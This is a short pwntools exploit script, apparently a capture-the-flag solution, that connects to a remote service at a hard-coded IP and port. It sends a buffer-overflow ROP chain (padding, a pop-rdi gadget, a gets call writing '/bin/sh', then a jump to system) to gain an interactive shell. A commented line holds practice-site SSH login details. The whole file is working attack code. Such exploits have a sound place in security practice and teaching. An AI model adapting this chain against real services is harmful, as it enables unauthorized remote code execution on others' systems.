#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./vuln", checksec = False)

# con = process()
# gdb.attach(con, gdbscript = '''
#         b*0x401243
#         c
#         ''')

#sh = ssh(host='pwnable.kr',user='passcode',port=2222,password='guest')
#con = sh.process("path")

con = remote("34.125.199.248", 6969)

rdi = 0x00000000004012bb
rw = 0x404080
system = 0x0401257
ret= 0x401243

payload = b"A" * 0x28 + p64(rdi) + p64(rw) + p64(elf.plt['gets']) + p64(rdi) + p64(rw) + p64(ret) + p64(system)

# input()
con.sendlineafter(b"password:", payload)
# input()
con.send(b"/bin/sh\0")

con.interactive()
